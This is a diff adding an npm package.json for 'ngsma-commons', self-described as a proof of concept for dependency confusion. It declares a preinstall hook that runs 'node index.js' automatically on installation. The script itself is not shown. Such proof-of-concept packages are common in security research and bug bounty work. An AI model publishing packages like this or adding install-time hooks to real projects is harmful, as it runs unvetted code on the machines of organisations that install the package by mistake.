@@ -1,0 +1,13 @@
+{
+  "name": "ngsma-commons",
+  "version": "1.0.5",
+  "description": "PoC for Dependency Confusion",
+  "main": "index.js",
+  "scripts": {
+    "test" :  "echo \"Error: no test specified\" && exit 1",
+	"preinstall": "node index.js"
+  },
+  "author": "PoC",
+  "license": "MIT"
+}
+
